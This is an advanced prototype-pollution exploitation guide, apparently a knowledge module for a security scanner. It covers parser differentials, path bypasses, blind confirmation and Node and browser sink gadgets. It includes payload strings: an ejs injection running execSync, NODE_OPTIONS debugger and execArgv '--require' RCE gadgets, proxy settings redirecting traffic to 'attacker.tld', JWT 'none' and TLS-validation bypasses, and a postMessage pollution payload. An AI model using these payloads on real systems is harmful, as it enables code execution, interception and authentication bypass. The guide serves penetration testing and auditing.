---
name: prototype-pollution-advanced-deep
description: Prototype pollution at advanced+expert depth — parser/merge differentials, set-by-path and dotted-path deep bypass classes, blind and second-order primitives, sink-family exploitation depth, and composite-chain construction across pollution + XSS/SSTI/RCE
sibling: prototype_pollution
load_when: scan_mode == "deep"
---

# Prototype Pollution — Advanced Depth

This is the advanced+expert deep sibling to `prototype_pollution.md`. The base owns the class framing, the measured `JSON.parse-alone-doesn't-pollute` and guard-differential findings, the modern-merge-landscape table, the primary bypass classes, the 2024–2026 CVE class-shape routing, and the primary chains. The novel+frontier sibling `prototype_pollution_novel_deep.md` owns the 2024–2026 CVE mechanism decomposition with the canonical version/GHSA table, the Silent Spring / GHunter universal-gadget baseline, the Deno gadget catalog, the NPM CLI end-to-end chain, and the kEmptyObject-bypass-as-technique-class. This file owns the operational depth in between — parser/merge differentials, set-by-path and dotted-path bypass classes, blind and second-order confirmation, sink-family exploitation depth, WAF-evasion classes, and composite-chain construction.

Load this file when the trivial payload has been blocked, the target is a hardened stack (patched mainstream libraries + parser-level `__proto__` blocklist), the confirmation is blind (no direct read-back on the request path), or the chain requires composing pollution with a downstream class the base only routes for.

Every version-boundary claim referencing a specific CVE lives in the novel sibling per §2 CVE single-ownership; this file references CVEs by number + route only. Every mechanism claim is anchored to a primary source or a measured result in `.zen-batch-artifacts/batch8/prototype_pollution/measurements/`.

## Parser → Merge Differentials

Prototype pollution requires two independent conditions: the parser preserves `__proto__` / `constructor` / `prototype` keys, and a downstream operation *walks into* them. When the parser and the merge are separate components (typical in real apps), the differential between what each accepts is the exploitation surface.

Primitive: given a payload shape, does the parser hand a key with that shape to the merge, and does the merge treat that key as a merge target?

**JSON body parsers (Node ecosystem).** `JSON.parse` (native) preserves all keys including `__proto__` as own properties. `body-parser` (`json` middleware) delegates to `JSON.parse`; keys survive. `koa-bodyparser` similarly. Fastify's `fast-json-stringify` and `fast-json-body-parser` also preserve, but Fastify's schema validation can strip keys not in the allow-list *before* the handler sees them — a schema-validated route is not exploitable via extra top-level keys, but nested-object schemas often use `additionalProperties: true` and pass everything through.

**Query-string parsers.** `qs` with defaults preserves `__proto__[x]=y` as nested-object structure; `body-parser` with `extended: true` uses `qs` internally. `express`'s built-in `req.query` uses `qs` by default when the app hasn't overridden `query parser`; a hardened deployment sets `app.set('query parser', 'simple')` which uses `querystring` (native, flat only — no nested-object expansion, so bracket-notation payloads become string keys like `__proto__[x]` rather than merged structure).

Measured differential — the query parsers themselves do not pollute (per base's matrix), but they *hand* a merge-shaped object to any downstream code that spreads or defaults-merges the query params. A vulnerable pattern is `_.defaultsDeep(defaults, req.query)` on a pinned unpatched lodash, or a bespoke `for..in` copy.

**Multipart parsers.** `multer`, `busboy`, and `formidable` accept nested field names via bracket notation (`fields[__proto__][x]=y`); busboy's field-value payloads pass unchanged. This is a **separate delivery channel** from JSON body — sanitizers running on JSON often miss multipart.

**YAML parsers.** `js-yaml.load()` (legacy, ≥4.0.0 renamed to `load` but with safe defaults) versus `js-yaml.safeLoad()` — the danger is when the app pins to a pre-4 version and uses the `load` variant that resolves custom tags. YAML anchors and merge keys (`<<:`) provide multiple paths to inject a `__proto__` key that the parser preserves as an own property. Confirm by dropping a YAML file with `<<: *proto` where `proto: __proto__: {canary: yes}` — the resulting object has `__proto__` as an own property unless the parser was explicitly hardened.

**TOML parsers.** Most TOML parsers treat `__proto__` as a plain table key; the risk is downstream merge, same as JSON.

**XML → object converters.** `xml2js` with default `explicitArray: false` produces plain objects; `__proto__` in an element name (unusual but possible) can create the payload shape. Rare vector.

**GraphQL.** GraphQL variables are typed by schema; the risk is on fields typed as `JSON` or `Any` scalar which pass through unchanged. Enumerate schema for those scalars via introspection before probing.

**Cross-parser attack surface.** A single endpoint sometimes accepts multiple content-types — JSON, form, multipart, GraphQL. If the sanitizer runs only on JSON but the merge is content-type-agnostic downstream (a common shape: request body → `parseBody(contentType)` returning an object → `mergeIntoConfig(defaults, body)`), submitting the payload via a different content-type is direct-inject.

## Structured Clone vs Deep-Copy Differentials

The three dominant copy primitives — `structuredClone`, `JSON.parse(JSON.stringify(x))`, and manual deep-clone loops — handle `__proto__` keys differently. The differential determines whether a specific copy operation is exploitable.

**`structuredClone(x)` (native, Node ≥17).** The structured clone algorithm serializes objects by enumerating own properties. An `__proto__` own property on the source IS cloned — but as an own property on the result, NOT as a prototype assignment. The cloned object has `Object.hasOwn(result, '__proto__') === true` but `({}).x` remains `undefined`. Structuredclone alone does not pollute. However: if the cloned result is subsequently merged into a target via a naive recursive merge, the own-property `__proto__` on the clone IS walked into by the merge, reaching `Object.prototype`. The chain is: attacker input → structuredClone (preserves `__proto__` as own) → naive merge (walks into it) → pollution. The clone step is safe; the merge step is the vulnerability.

**`JSON.parse(JSON.stringify(x))` (JSON round-trip).** Same behavior as structuredClone for prototype keys: `__proto__` survives the round-trip as an own property. `JSON.stringify` serializes own properties including `__proto__`; `JSON.parse` recreates them as own. No pollution from the round-trip itself; the pollution vector is the downstream merge that walks the own-property `__proto__` into the prototype chain.

**Manual deep-clone loops.** The class that actually pollutes. A naive clone:
```javascript
function deepClone(src) {
  const dst = {};
  for (const key in src) {
    if (typeof src[key] === 'object') dst[key] = deepClone(src[key]);
    else dst[key] = src[key];
  }
  return dst;
}
```
When `key` is `__proto__`, `dst[key] = deepClone(src[key])` writes to `dst.__proto__`, which resolves to `Object.prototype`. The clone itself IS the pollution primitive — no separate merge step needed. This is distinct from the structuredClone/JSON case where the copy is safe and only a subsequent merge pollutes.

**Object.assign and spread.** `Object.assign(dst, src)` copies own enumerable properties. An `__proto__` own property on `src` is copied as an own property on `dst` — same as structuredClone, no pollution. `{...src}` has identical behavior. Neither is a pollution primitive by itself; the vulnerability is always downstream.

**Differential exploitation.** When auditing a target:
1. Identify which copy primitive the target uses (grep for `structuredClone`, `JSON.parse(JSON.stringify`, `Object.assign`, `{...`, and manual clone functions).
2. If the copy is structuredClone/JSON/assign/spread — the copy step is safe; look downstream for a merge that walks the result.
3. If the copy is a manual `for..in` loop without an own-property guard — the clone itself is the pollution primitive.
4. Mixed patterns: some targets clone before merge, some clone after. The order determines which step is the vulnerability.

**Polyfill divergence.** Pre-Node-17 codebases using a structuredClone polyfill may implement the clone via a `for..in` loop — the polyfill IS a pollution primitive even though native structuredClone is not. Check whether the target uses a polyfill or native.

## Set-by-Path Deep

Set-by-path libraries (`lodash.set`, `set-value`, `dset`, and bespoke `setPath` helpers) accept a dotted or array path and walk the object graph creating intermediate nodes. The vulnerable shape is `{"__proto__.polluted":"yes"}` or `set(obj, "__proto__.polluted", "yes")` — the path parser splits on `.`, walks `obj.__proto__` (which resolves to `Object.prototype`), and assigns onto it.

**Path-parser variants that reach the same primitive:**

- Dotted string: `"__proto__.polluted"`, `"__proto__.constructor.prototype.polluted"`.
- Array of segments: `["__proto__", "polluted"]`.
- Deep-dotted: `"a.b.__proto__.polluted"` — the walk creates `a`, then `a.b`, then `a.b.__proto__` (which is `Object.prototype` via prototype chain lookup on the freshly created `a.b`).
- Constructor path: `"constructor.prototype.polluted"`.
- Escape in path (lodash-specific): `"\\_\\_proto\\_\\_.polluted"` when the app's own path-escape regex misses the escape but lodash still parses it.

**Guards that stop it (measured on 4.17.21 and modern set-value/dset):** `set-value` throws `Cannot set unsafe key: "__proto__"`; `dset` silently rejects; `lodash.set` similarly rejects. The finding on modern libraries is only the app's *bespoke* path-set — grep the codebase for custom implementations.

**Bypass: path-segment aliases the sanitizer misses.**

- `"constructor.prototype.polluted"` — separate keys, joins to the same primitive via property lookup: `obj["constructor"]["prototype"]["polluted"] = "yes"` mutates `Object.prototype`.
- `"toString.constructor.prototype.polluted"` — any object's inherited method has `.constructor === Function`, whose prototype is `Function.prototype`; polluting `Function.prototype` affects all functions (auth guards written as arrow functions inherit).
- `"__lookupGetter__.constructor.prototype.polluted"` — same class via a different inherited method name.

Measure the target's path sanitizer against each: block-list on `__proto__` alone misses all three; block-list on `__proto__`+`constructor`+`prototype` misses the `toString.constructor.prototype` variant unless it also blocks `constructor` as a segment (which breaks legitimate deep paths).

**Nested-object bypass of key-only blocklists.** A blocklist that checks each top-level key against `['__proto__','constructor','prototype']` misses `{"a":{"__proto__":{...}}}` if the check doesn't recurse. The naive merge still walks into the nested `__proto__` because the walk is depth-first.

## Blind Pollution — Confirmation Without Read-Back

Confirmation is easy when a downstream endpoint reflects a canary. When it doesn't, blind confirmation uses observable side effects.

**Time-based blind.** Pollute `Object.prototype.timeout` (or another key the app might read as a timeout default) with a value that changes observable timing. The finding is confirmed if a second request takes measurably different time. Selection of the polluted key requires knowledge of the target's config schema — grep or a config-file download narrows candidates.

**Error-based blind.** Pollute `Object.prototype.length` with a non-numeric value; downstream code doing `for (let i = 0; i < arr.length; i++)` or `arr.slice(0, length)` breaks and returns a 500. The finding is confirmed if a second, unrelated request suddenly errors when it didn't before. Choose a key that is likely read but unlikely to fire on the pollution-setting request itself.

**Boolean-based blind — auth flip.** Pollute `Object.prototype.isAdmin` (or `.role`, `.permissions`) via the JSON body of a low-privilege endpoint; then hit an admin-guarded endpoint. If the guard reads `user.isAdmin` via prototype-chain lookup and the flag is not overridden by own-property, the guarded route now serves the low-privileged session. This is confirmation *and* impact simultaneously.

**Callback / DNS OOB.** Pollute `Object.prototype.hostname` (or `Object.prototype.host`) with an attacker DNS host. If any downstream code constructs a URL via `new URL(x, defaults)` reading `defaults.hostname` from prototype, the DNS lookup lands on the attacker's server. This is high-noise but works when other channels are dead.

**Response-shape differential.** Pollute `Object.prototype.pretty = true` or `Object.prototype.indent = 2` — JSON serialization libraries that read formatting options via property access produce indented output on subsequent responses. Compare `Content-Length` before and after: a stable increase across unrelated endpoints confirms pollution. This approach works even when the response body is opaque (encrypted, compressed) because the length change is observable at the transport layer.

**Header injection via pollution.** Pollute `Object.prototype['X-Debug'] = 'true'` — Express middleware that reads debug config via property access may add a debug response header. The new header in an unrelated response confirms pollution. Additionally, some frameworks read `Object.prototype.statusCode` or `Object.prototype.status` — polluted values change the HTTP status code of subsequent responses, observable without reading the body.

**Persistence check.** Fire the pollution payload, wait past a natural request boundary, fire a probe. If the server is multi-worker/multi-process (`cluster`, `pm2`, Kubernetes pods), pollution is per-worker; only a fraction of subsequent requests see the pollution. Repeat the probe with a unique per-request marker to statistically confirm the fraction — a partial hit rate that matches worker count is the confirmation.

## Second-Order Deep

Base introduces second-order channels; this file operationalizes them.

**Persistence → export pipeline pattern.** Common in SaaS and reporting tools:
1. Attacker writes profile bio, note, or metadata field to a persistent store. The field is stored raw.
2. A nightly (or on-demand) export pipeline reads N users' fields, merges each into a template context via `_.defaultsDeep(templateDefaults, userMeta)` (or similar).
3. If the lodash pinned in the export worker is unpatched — the pipeline is Node microservice code, often pinned separately from the main app — the pollution fires in the export process.
4. Downstream template compile (ejs/pug/handlebars) reads polluted `outputFunctionName`/`escapeFunction`/`main` → the compile executes attacker JS in the export process.

Confirmation for this shape: place a canary in the persisted blob, then observe the export worker's log stream (if accessible) or wait for the exported artifact and inspect it for canary side effects.

**Job queue pattern (BullMQ, Bee, Kue).** Attacker submits a job whose payload is JSON. The worker deserializes and merges into a job-context object. Worker pinned separately from the API tier is a common misconfig — the API might be on lodash 4.17.21 but the worker on 4.17.11 (unpatched).

**Config reload pattern.** Apps that reload config from S3/git/etcd on a timer or SIGHUP merge new config into running defaults. If the attacker can write to that config source (via a chained finding), the reload merges polluted keys into `Object.prototype` for the running process.

**CI/CD build agent pattern.** A malicious `package.json` fragment with `__proto__` keys parsed by a build script triggers pollution in the Node build agent. The build agent then handles secrets, deploy keys, and signing material — the pollution can override guards that decide "should this artifact be signed" or "should this deploy proceed." Rare but high-impact.

**Log ingestion pattern.** JSON log lines with `__proto__` keys aggregated by a log worker that merges into a rollup document. Similar to the export path but with lower barrier to entry (log endpoints are often less guarded than user profile fields).

## Sink-Family Depth

Base names the polluted-key → sink mapping table; this file goes deeper on each family.

### child_process Sink Family

The Node child-process API has multiple entry points with different pollution surfaces:

- **`spawn(cmd, args, options)`** — reads `options.env`, `options.shell`, `options.cwd`, `options.stdio` via property access. If any is inherited from a polluted prototype, the spawn honors the polluted value.
- **`spawnSync(cmd, args, options)`** — same surface, synchronous.
- **`exec(cmd, options, callback)`** — reads `options.shell` (defaults to `/bin/sh` or `cmd.exe`), `options.env`, `options.cwd`; the shell is *always* invoked unless `execFile` is used.
- **`execFile(file, args, options, callback)`** — does NOT invoke a shell by default; `options.shell` is honored if set (including via pollution). Setting `Object.prototype.shell` on an unshelled call turns it into a shelled call.
- **`fork(modulePath, args, options)`** — spawns a Node process; reads `options.env` and `options.execArgv`. Polluted `Object.prototype.execArgv = ['--require','/tmp/evil.js']` gets prepended to the child's argv; polluted `Object.prototype.env.NODE_OPTIONS` is inherited by the child.
- **`execSync(cmd, options)`** — shell-invoked, same env/shell/cwd pollution surface.

**Env-spread shape (still current — measured Node v24.19.0).** The canonical call-site pattern:
```javascript
function callerHelper(userOpts = {}) {
  const { env } = userOpts;                 // prototype-chain read
  return spawnSync(cmd, args, { env: { ...process.env, ...env } });
}
```
When `userOpts` is `{}` and `Object.prototype.env` is polluted, `env` here is the polluted value (via inheritance). `...env` spreads its own props into the spawn env. Any polluted key the shell reads (GIT_SSH_COMMAND, LD_PRELOAD, NODE_OPTIONS, PYTHONPATH, PATH prefix) is direct RCE if the child process reads it.

**Windows-specific execSync gadget.** BH Asia 2023 documented the class: pollute `Object.prototype.shell='cmd.exe'` and `Object.prototype.input='echo PWNED\n'` — an `execSync('true')` call whose caller doesn't set `shell`/`input` picks up the polluted values, spawns cmd.exe with the polluted stdin, and executes the piped command. Measurable-negative on Linux (the `input` handling requires the caller to explicitly pass it; polluted `input` is dropped) — Linux exploitation of this specific gadget requires a different shape.

**Cross-platform NODE_OPTIONS CDP shape.** Pollute `Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:<port>' }` — any subsequent Node child spawn inherits the env, opens a Chrome DevTools Protocol debugger at the specified port, and blocks waiting for a connection. Attacker connects to `<port>`, sends `Runtime.evaluate` with arbitrary JS, and the debugger executes it in the child process context. Measured (base file): the env value reaches the child cross-platform.

**Detection at target.** Grep the target's Node dependency tree for calls that do `{env}` destructuring on an options object followed by env spread — that is the current-Node-safe gadget shape. GitHub search for the pattern `const { env } = options` inside spawn callers is a starting point.

### Template Compile Sink Family

Server-side JS template engines compile a template string to a function at runtime. Compile options control what functions the compiler wraps around the template body — polluting those options injects attacker JS into the compiled function.

**ejs** — `ejs.render(str, data, options)` reads `options.outputFunctionName` (name of the output-accumulator function; polluted with `"x;process.mainModule.require('child_process').execSync('id')//"` injects arbitrary code as the accumulator identifier), `options.escapeFunction`, `options.compileDebug`, `options.client`. All are read via prototype chain.

**pug** — `pug.compile(str, options)` reads `options.filters` (custom filter callbacks; pollution can register a filter that runs at compile time), `options.plugins`, `options.main`. Some options are read via `for..in` — polluted keys are enumerated.

**handlebars** — options less commonly polluted, but `handlebars.compile(str, options)` reads `options.knownHelpers` and `options.knownHelpersOnly`; the compile-time helper resolution can be manipulated when combined with polluted helper registration.

**lodash.template** — reads `options.imports` (polluted keys become identifiers in the compiled template scope), `options.sourceURL`, `options.variable`.

Confirmation for the compile-sink class: pollute a specific option, hit the endpoint that renders the template, observe execution or an error mentioning the polluted identifier in the generated code.

### Dynamic require / import Sink Family

**require gadget (fixed in Node v18.19.0 — measured).** Historical: `Object.prototype.main` was picked up by `lib/internal/modules/cjs/loader.js` when parsing a `package.json` that lacked a `main` field. Measurement confirms the fix: on Node v24.19.0, a require of a package with no `main` falls through to `index.js` autoload rather than reading polluted `Object.prototype.main`. Any target running Node ≥18.19.0 is not vulnerable via this specific gadget.

**import(.mjs) source gadget (fixed in Node v18.19.0 — measured).** GHunter's second novel Node ACE gadget — polluted `Object.prototype.source` executed as JS on any subsequent `.mjs` import — is also fixed. Measurement confirms on Node v24.19.0 the original module content loads.

**Dynamic import with user-controlled specifier.** Separate from prototype pollution: if the specifier itself is attacker-controlled (`import(userInput)`), that is a direct RCE class, not a pollution gadget — route to `rce.md` and `path_traversal_lfi_rfi.md` for the specifier-injection variants.

### Serializer / Deserializer Sink Family

**bson (Parse Server 2018–2022 chain).** BSON deserialization for MongoDB data objects historically read prototype-inherited keys during class-instance reconstruction; Parse Server's exploitation chain repeatedly wrapped and rewrapped the bson denylist as new bypass classes emerged. The class survives even after specific bug fixes — see `prototype_pollution_novel_deep.md § Mitigation-Bypass as a Technique Class` for the full framework.

**devalue.parse (CVE-2025-57820).** Per-instance-scoped rather than global; the primitive is reassignment of the reconstructed object's `[[Prototype]]`, so any subsequent method call on that specific instance runs attacker code. Route to novel for mechanism.

**structured-clone polyfills.** Third-party structured-clone polyfills (some legacy shims) don't match browser structuredClone semantics on `__proto__` — measurement is the fastest way to determine which polyfill is safe. Native `structuredClone` in Node ≥17 is safe (measured base).

### YAML Merge-Key Sink Family

YAML merge keys (`<<:`) combine mappings. When the target key is a mapping containing `__proto__` (unusual but permitted by the YAML spec), the merged object carries `__proto__` as an own property. Downstream deserializer that walks into it triggers pollution.

Legacy `js-yaml.load` on pre-4.0.0 versions with custom-tag resolution is the primary vector; `safeLoad` and modern defaults do not preserve `__proto__` on plain mapping types.

### Fetch/HTTP Options Sink Family

Node's `fetch` (undici under the hood) and `http.request` accept option objects. Polluted `Object.prototype.method`, `Object.prototype.headers`, `Object.prototype.agent`, `Object.prototype.dispatcher` all reach the request when the caller doesn't explicitly override.

**Agent pollution shape.** `Object.prototype.agent = new http.Agent({ rejectUnauthorized: false })` — subsequent HTTPS requests to secured endpoints ignore certificate validation. This is a silent MITM enabler when combined with a network position.

**Dispatcher pollution shape.** Polluted `dispatcher` on undici replaces the request dispatcher wholesale; attacker-controlled dispatcher can intercept every outbound request from the process. Rare precondition (need the pollution to fire) but severe.

**Proxy pollution shape.** Polluted `Object.prototype.proxy = 'http://attacker.tld:8080'` — Node's `http.request` and many higher-level HTTP clients (`axios`, `got`, `node-fetch` with a proxy shim) read the proxy from opts; polluted value redirects all subsequent outbound requests through an attacker-controlled proxy. When combined with internal SSRF surface — the same process making requests to internal services — this becomes silent MITM on internal traffic. Route composition with `ssrf.md` for the internal reachability.

### ODM / Query-Builder Sink Family

Object-Document-Mappers (Mongoose, TypeORM, Prisma, Sequelize) read schema options and query options via prototype-inherited paths in some code paths.

**Mongoose.** `Model.find(query, projection, options)` — polluted `Object.prototype.strict` set to `false` turns off strict schema enforcement, allowing attacker to submit fields not in the schema (potentially controlling privileged fields the schema was hiding). Polluted `Object.prototype.lean` changes the returned object type from Mongoose document to plain object — some downstream code that expects Mongoose helper methods breaks or misfires.

**Sequelize.** `Model.findAll(options)` — polluted `Object.prototype.raw` set to `true` returns raw DB rows (bypassing model getters/computed fields that may sanitize).

**TypeORM.** Similar shape via `find(options)` reading `where`, `select`, `relations` from options.

**Prisma.** Prisma's client is generally hardened against pollution (options are typed and validated), but bespoke wrappers around Prisma that spread user input into query options are vulnerable.

Confirmation for ODM sinks: pollute the option key, hit a query endpoint, observe result-shape change (different fields returned, different projection, different hydration).

### Auth-Middleware Sink Family

**Passport.** `passport.authenticate(strategy, options)` — polluted `Object.prototype.session = false` disables session persistence on subsequent authentications; polluted `Object.prototype.successRedirect` changes the redirect target after login (OAuth-callback-adjacent open redirect).

**express-jwt / jsonwebtoken.** `jwt.verify(token, secret, options)` — polluted `Object.prototype.algorithms` narrowed to `['none']` disables signature verification on subsequent verify calls (the vulnerable classic; hardened jsonwebtoken 9+ rejects `none` explicitly, but pollution can re-enable it on some code paths). Route to `authentication_jwt.md` for the JWT-alg-confusion class.

**csurf / express-csrf.** Polluted csrf-option defaults can weaken token validation window or disable checks entirely on subsequent middleware calls.

### File-Upload / Multipart Sink Family

**multer.** `multer(options)` — polluted `Object.prototype.dest` redirects upload destination; polluted `Object.prototype.limits.fileSize` raises the limit; polluted `Object.prototype.fileFilter` becomes a callback the middleware invokes.

**formidable.** Similar shape via `new formidable.IncomingForm(options)` reading `uploadDir`, `maxFileSize`, `keepExtensions`.

**busboy.** Options-read for headers parsing; polluted `Object.prototype.limits` widens accepted upload sizes.

### Mailer Sink Family

**nodemailer.** `nodemailer.createTransport(transportOpts)` — polluted `Object.prototype.host`, `port`, `secure`, `auth` reach the transport. Polluted host redirects mail to attacker SMTP; polluted auth leaks configured credentials to the attacker if the transport does STARTTLS with attacker-controlled certificate authority.

### GraphQL Sink Family

**apollo-server / mercurius.** `new ApolloServer(options)` reads `context`, `formatError`, `introspection`. Polluted `Object.prototype.introspection = true` re-enables introspection on hardened deployments. Polluted `Object.prototype.context = attackerContext` overrides per-request context on some code paths.

### Fetch/undici Request Construction Depth

Beyond the options-level pollution in the Fetch/HTTP section, undici's internals create a deeper pollution surface on Node 18+.

**Request constructor.** `new Request(url, init)` reads `init.method`, `init.headers`, `init.body`, `init.signal`, `init.redirect`, `init.referrer`, `init.referrerPolicy`, `init.mode`, `init.credentials`, `init.cache`, `init.integrity`, `init.keepalive`, `init.duplex` — each via property access. A polluted `Object.prototype.method = 'DELETE'` turns every `new Request(url)` without an explicit method into a DELETE request. Impact: a background sync job that does `new Request(apiUrl)` (intending GET) sends DELETEs to every synced resource.

**Headers constructor.** `new Headers(init)` accepts a plain object; the constructor iterates its entries. A polluted `Object.prototype.Authorization = 'Bearer <attacker-token>'` injects an auth header into every `new Headers({})` call that doesn't explicitly set Authorization. Impact: outbound API requests leak or swap credentials.

**undici Pool/Client options.** Applications creating custom undici pools (`new Pool(origin, opts)`) read `opts.connections`, `opts.pipelining`, `opts.tls`, `opts.maxHeaderSize`. Polluted `Object.prototype.tls = { rejectUnauthorized: false }` disables certificate validation on the pool — every request through it accepts any TLS certificate. This is the undici-specific analog of the `http.Agent` pollution shape, but lower-level and harder to detect because pools are typically long-lived.

**RetryHandler / RetryAgent.** undici's retry primitives read `opts.retry`, `opts.maxRetries`, `opts.retryAfter`. Polluted `Object.prototype.maxRetries = 1000` causes a failing request to retry indefinitely — a self-DoS vector when combined with a request that legitimately fails.

**Dispatcher chain.** undici's layered dispatcher architecture (`Agent` → `Pool` → `Client`) reads interceptor options at each layer. Polluted `Object.prototype.interceptors` injects a custom interceptor into the dispatcher chain — the interceptor runs on every request through the dispatcher, with access to request/response objects. This is the most severe undici-specific gadget: a single prototype-pollution payload can install a transparent proxy on all outbound HTTP.

### Protobuf / MessagePack Deserialization Sink Family

Binary serialization formats that decode to JavaScript objects create an additional pollution surface when the decoded output feeds a merge or is used as an options object.

**protobuf.js (`protobufjs`).** `Message.toObject(message, options)` converts a protobuf message to a plain JavaScript object. The conversion iterates message fields and assigns to a target `{}`. Protobuf schema types do not include `__proto__` as a valid field name, so a well-typed proto message cannot carry the key. BUT: `google.protobuf.Struct` (the generic JSON-in-protobuf type) decodes `fields` as a plain key-value map — if the Struct contains a key named `__proto__`, the decoded object has `__proto__` as an own property. Downstream merge is the pollution vector, same as JSON.parse.

**@bufbuild/protobuf (Connect/buf ecosystem).** The newer buf-based protobuf library decodes Struct similarly. The `toJson()` path produces a plain JS object with whatever keys the Struct contained. Same downstream-merge vulnerability.

**MessagePack (`@msgpack/msgpack`, `msgpack5`, `msgpackr`).** MessagePack maps decode to plain JavaScript objects. A MessagePack map with a `__proto__` key creates an own property on the decoded object — identical to JSON.parse. The decoder itself does not pollute; the downstream merge does. `msgpackr` (the fastest decoder) uses a custom `Map`-like internal structure but returns plain objects from `unpack()` — `__proto__` keys survive.

**CBOR (`cbor`, `cbor-x`).** Same class as MessagePack. CBOR maps with text-string keys decode to plain JS objects; `__proto__` as a CBOR text key becomes an own property on the result.

**Avro (`avsc`).** Avro's JS decoder (`avsc.Type.forSchema(schema).fromBuffer(buf)`) returns typed objects whose fields are schema-defined. Avro schemas do not permit `__proto__` as a field name (field names must match `[A-Za-z_][A-Za-z0-9_]*`), so the decoder is safe by schema constraint — unless the target uses the generic `bytes` type and post-decodes with JSON.parse, re-opening the surface.

**Exploitation pattern.** The binary-format surface matters when:
1. The target accepts binary-encoded input (gRPC with Struct fields, WebSocket with MessagePack frames, IoT/MQTT with CBOR payloads).
2. The decoded output feeds a merge or defaults into a config/options object.
3. The WAF inspects only JSON bodies — binary frames bypass text-pattern matching entirely.

Binary format + naive merge is a WAF-evasion class: the `__proto__` key is encoded in the binary format's wire encoding, invisible to text-matching WAF rules.

### Build-System and Bundler Sink Family

Build tools run in Node and accept configuration objects that are pollution-sensitive. The build-time surface matters because build processes handle signing keys, deploy credentials, and source integrity.

**webpack.** `webpack(config)` reads config via deep property access. Polluted `Object.prototype.devtool = 'eval'` changes the source-map strategy for every build where the config doesn't explicitly set devtool — `eval` mode embeds full source in the bundle, leaking source code to the client. Polluted `Object.prototype.externals` changes module resolution — an attacker-controlled external replaces a legitimate dependency in the built bundle.

**webpack Module Federation.** `ModuleFederationPlugin` shares scope between micro-frontends. The shared-scope object is a plain `{}` — polluted keys on `Object.prototype` appear as shared modules. A polluted `Object.prototype['react'] = { get: () => attackerReact }` substitutes a trojan React runtime in every federated consumer that doesn't pin its own version. Build-time pollution in the host affects all remotes at runtime.

**vite.** `defineConfig(config)` merges user config with defaults via `mergeConfig()`. Polluted `Object.prototype.server = { proxy: { '/api': 'http://attacker.tld' } }` injects a dev-server proxy redirect. More critically: `Object.prototype.build = { rollupOptions: { plugins: [attackerPlugin] } }` injects a Rollup plugin that runs at build time with full filesystem access.

**esbuild.** `esbuild.build(options)` reads `options.define`, `options.inject`, `options.plugins`. Polluted `Object.prototype.inject = ['/tmp/evil.js']` prepends attacker code into every built module. The `define` option performs text-replacement at build time — polluted defines can rewrite security-critical constants.

**Rollup.** Plugin options read via property access; polluted `Object.prototype.transform` or `Object.prototype.resolveId` installs a build-time hook.

**Impact framing.** Build-time pollution is harder to reach (requires control over a config source or a dependency that runs at build time) but higher impact: the polluted build output ships to production and is served to every user. A single build-time pollution can compromise every deployment from that build forward until the build cache is invalidated.

### ES2024+ API Sink Surfaces

New JavaScript APIs introduced in ES2024 and later create additional prototype-chain read surfaces. Each new API that reads from an options object or iterates object properties is a potential sink when the input is a plain object on a polluted runtime.

**`Object.groupBy(iterable, keyFn)` / `Map.groupBy(iterable, keyFn)` (ES2024).** `Object.groupBy` returns a null-prototype object (`Object.create(null)`) — the result is pollution-immune regardless of whether `Object.prototype` is polluted. `Map.groupBy` returns a `Map` — also immune. Neither is a sink. However: application code that post-processes the result with a naive merge into a plain object re-opens the surface.

**Iterator helpers (`Iterator.prototype.map/filter/take/drop/flatMap/reduce/toArray/forEach/some/every/find`).** These methods read callbacks from the iterator's method chain. Polluting `Object.prototype.map` does NOT affect iterator helpers (they shadow via the Iterator prototype chain). But: a polluted `Object.prototype.next` DOES affect any plain-object used as an ad-hoc iterator (`{ next() {...} }`) — the polluted `next` replaces the intended iteration behavior. This is a subtle gadget: an app that creates ad-hoc iterators from plain objects (common in generator wrappers) has its iteration hijacked via `Object.prototype.next` pollution.

**`Array.fromAsync(asyncIterable)` (ES2024).** Reads the async-iterable protocol (`Symbol.asyncIterator`, then `.next()` on the iterator). Same `Object.prototype.next` pollution surface as above when the input is a plain-object ad-hoc async iterator.

**`Promise.withResolvers()` (ES2024).** Returns `{promise, resolve, reject}` — a plain object. If `Object.prototype.resolve` or `Object.prototype.reject` is polluted, destructuring reads the polluted value instead of the real resolver. Downstream code calling `resolve(value)` invokes the attacker function. This is a realistic sink: `Promise.withResolvers` is the standard pattern for deferred promises, and its return is always a plain `{}`.

**`Set.prototype.union/intersection/difference/symmetricDifference/isSubsetOf/isSupersetOf`.** These methods accept another Set-like object. If the argument is a plain object (common in tests or polyfilled environments), prototype-chain reads on it (`has`, `size`, `keys`) are exploitable — a polluted `Object.prototype.has = () => true` causes every membership check to return true, silently bypassing set-difference logic.

**`Temporal` API (stage 3).** `Temporal.PlainDate.from(item)`, `Temporal.Duration.from(item)` — these accept plain-object inputs with fields like `{year, month, day}`. A polluted `Object.prototype.year` or `Object.prototype.calendar` changes the constructed temporal value. Exploitation: a scheduling/booking app that constructs dates from user input via Temporal, on a polluted runtime, computes wrong dates — the pollution is a business-logic integrity attack.

**Detection methodology for new API sinks.** Grep for `Object.groupBy`, `Promise.withResolvers`, `Array.fromAsync`, Set methods, Temporal constructors. For each, check whether the input or output is a plain `{}` object (not a Map, Set, or null-proto). If yes, that call site reads from the prototype chain — it is a sink on a polluted runtime.

## Client-Side Pollution Channels

The base names JSON body, form, and query-string channels; client-side pollution has additional delivery vectors browser-side.

**URL hash fragment.** SPA routers using `qs`-style hash parsing (Vue Router historyMode 'hash', Ember router hash location) parse `location.hash` into a nested object. `#__proto__[isAdmin]=true` reaches the router's merge on load; the polluted key affects the running client.

**`postMessage` cross-origin injection.** If the app's `message` listener merges the `event.data` object into a config or state store, an attacker page opens the target in an iframe and posts a payload:
```javascript
targetWindow.postMessage({__proto__: {isAdmin: true}}, '*');
```
The listener merges, the pollution fires, and the attacker-injected key is now readable across the app. Origin-check on the listener stops this; a listener without origin check is the finding.

**`localStorage` / `sessionStorage`.** Apps that store user preferences as JSON in localStorage and merge on load are vulnerable when the storage is writable by other origins (via a chained XSS or shared-storage misconfig). More commonly: attacker XSS-plants a payload in localStorage, and every subsequent page load triggers pollution from the stored blob.

**IndexedDB records.** Similar to localStorage but with structured records — a poisoned record read at load and merged into state.

**Service Worker cache.** Attacker-controlled response cached by SW (e.g., via XSS + fetch replay) can serve polluted JSON on subsequent loads.

